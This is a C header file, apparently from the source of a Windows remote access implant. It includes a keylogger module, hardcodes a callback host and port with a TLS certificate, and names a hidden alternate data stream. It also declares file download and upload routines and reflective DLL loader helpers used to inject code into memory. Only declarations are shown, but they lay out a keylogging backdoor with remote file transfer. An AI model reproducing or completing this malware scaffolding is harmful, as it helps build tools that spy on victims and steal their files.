#pragma once

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <ws2tcpip.h>
#include <winsock2.h>
#include <Windows.h>
#include <wininet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <openssl/crypto.h>
#include <stdio.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <direct.h>
#include "keylogger.h"

#define CERT_FILE "server.crt"
#define NEW_STREAM L":PRIVATE"
#define BUFFER_SIZE 18324
#define NUM_FUNCS 9
#define funclistlength 10
#define HOST "192.168.1.120"
#define PORT 9001

BOOL downloadfile(const CHAR* url, const CHAR* filePath, CHAR** output);
BOOL uploadfile(const CHAR* filePath, const CHAR* serverUrl, CHAR** output);

DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer);
DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress);
int is_number(const char* str);






